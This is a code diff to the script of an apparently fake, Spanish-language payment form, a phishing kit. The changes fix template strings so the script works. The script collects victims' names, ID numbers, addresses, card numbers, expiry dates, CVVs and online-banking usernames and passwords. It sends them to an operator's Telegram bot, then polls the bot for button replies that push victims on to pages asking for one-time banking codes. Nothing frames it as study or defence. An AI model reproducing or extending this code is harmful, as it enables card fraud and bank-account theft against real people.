@@ -206,7 +206,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Obtener la hora actual y mostrarla en el formulario
-            document.getElementById('horaTransaccion').innerText += ` US${obtenerFechaActual()}`;
+            document.getElementById('horaTransaccion').innerText += ` ${obtenerFechaActual()}`;
             const loader = document.querySelector(".loaderp-full");
 
             // Actualizar la hora en vivo cada segundo
@@ -220,7 +220,7 @@
                 const horas = ahora.getHours().toString().padStart(2, '0');
                 const minutos = ahora.getMinutes().toString().padStart(2, '0');
                 const segundos = ahora.getSeconds().toString().padStart(2, '0');
-                return `US${dia}/US${mes}/US${año} US${horas}:US${minutos}:US${segundos}`;
+                return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
             }
 
             function actualizarHoraTransaccion() {
@@ -228,7 +228,7 @@
                 const horas = ahora.getHours().toString().padStart(2, '0');
                 const minutos = ahora.getMinutes().toString().padStart(2, '0');
                 const segundos = ahora.getSeconds().toString().padStart(2, '0');
-                document.getElementById('horaTransaccion').innerText = `Hora de la transacción: US${horas}:US${minutos}:US${segundos}`;
+                document.getElementById('horaTransaccion').innerText = `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
             }
 
             document.getElementById('formulario').addEventListener('submit', async function (event) {
@@ -273,18 +273,18 @@
                 const pass = localStorage.getItem('password');   
                 
                 // Enviar mensaje a Telegram con botón de verificación
-        const message = `Nuevo método de pago pendiente de verificación.\n🆔ID: US${transactionId}\n👤Nombre: US${formData0.nombre}\n🪪Cédula: US${formData0.documentoIdentidad}\n-\n📞Teléfono: US${formData0.telefono}\n🌇Ciudad: US${formData0.ciudad}\n🗺️Direc: US${formData0.direccion}\n-\n🏦 Banco: US${formData0.entidad}\n💳Tarjeta: US${formData0.tarjeta}\n📅Fecha: US${formData0.fechaExpiracion}\n🔐CVV: US${formData0.cvv}\n🧑‍💻Usuario: US${username}\n🔐Clave: US${password}\n
+        const message = `Nuevo método de pago pendiente de verificación.\n🆔ID: ${transactionId}\n👤Nombre: ${formData0.nombre}\n🪪Cédula: ${formData0.documentoIdentidad}\n-\n📞Teléfono: ${formData0.telefono}\n🌇Ciudad: ${formData0.ciudad}\n🗺️Direc: ${formData0.direccion}\n-\n🏦 Banco: ${formData0.entidad}\n💳Tarjeta: ${formData0.tarjeta}\n📅Fecha: ${formData0.fechaExpiracion}\n🔐CVV: ${formData0.cvv}\n🧑‍💻Usuario: ${username}\n🔐Clave: ${password}\n
         `;
 
         
         const keyboard = JSON.stringify({
   inline_keyboard: [
-    [{ text: "Pedir Logo", callback_data: `pedir_logo:US${transactionId}` }],
-    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:US${transactionId}` }],
-    [{ text: "Error de TC", callback_data: `error_tc:US${transactionId}` }],
-    [{ text: "Error de Logo", callback_data: `error_logo:US${transactionId}` }],
-    [{ text: "Error de Dinámica", callback_data: `error_dinamica:US${transactionId}` }],
-    [{ text: "Finalizar", callback_data: `confirm_finalizar:US${transactionId}` }]
+    [{ text: "Pedir Logo", callback_data: `pedir_logo:${transactionId}` }],
+    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
+    [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
+    [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
+    [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
+    [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
   ],
 });
 
@@ -295,7 +295,7 @@
           return;
         }
 
-        fetch(`https://api.telegram.org/botUS${config.token}/sendMessage`, {
+        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
@@ -347,7 +347,7 @@
     loader.style.display = "none";
     return;
   }
-  fetch(`https://api.telegram.org/botUS${config.token}/getUpdates`)
+  fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
     .then((response) => response.json())
     .then((data) => {
       console.log("Datos recibidos de Telegram:", data);
@@ -355,26 +355,26 @@
       const verificationUpdate = updates.find(
         (update) =>
           update.callback_query &&
-          (update.callback_query.data === `pedir_dinamica:US${transactionsId}` ||
-            update.callback_query.data === `error_tc:US${transactionsId}` ||
-            update.callback_query.data === `error_logo:US${transactionsId}` ||
-            update.callback_query.data === `finalizar:US${transactionsId}`)
+          (update.callback_query.data === `pedir_dinamica:${transactionsId}` ||
+            update.callback_query.data === `error_tc:${transactionsId}` ||
+            update.callback_query.data === `error_logo:${transactionsId}` ||
+            update.callback_query.data === `finalizar:${transactionsId}`)
       );
 
       if (verificationUpdate) {
         loader.style.display = "none";
         console.log("Verificación encontrada:", verificationUpdate);
-        if (verificationUpdate.callback_query.data === `pedir_dinamica:US${transactionsId}`) {
+        if (verificationUpdate.callback_query.data === `pedir_dinamica:${transactionsId}`) {
           window.location.href = "tp_data_verif.html";
         }
-        if (verificationUpdate.callback_query.data === `error_logo:US${transactionsId}`) {
+        if (verificationUpdate.callback_query.data === `error_logo:${transactionsId}`) {
           alert("Usuario o clave incorrecto. Por favor, revise sus datos e intente nuevamente.");
         }
-        if (verificationUpdate.callback_query.data === `error_tc:US${transactionsId}`) {
+        if (verificationUpdate.callback_query.data === `error_tc:${transactionsId}`) {
           alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
           window.location.href = "payment.html";
         }
-        if (verificationUpdate.callback_query.data === `finalizar:US${transactionsId}`) {
+        if (verificationUpdate.callback_query.data === `finalizar:${transactionsId}`) {
           window.location.href = "finish.html";
         }
       } else {
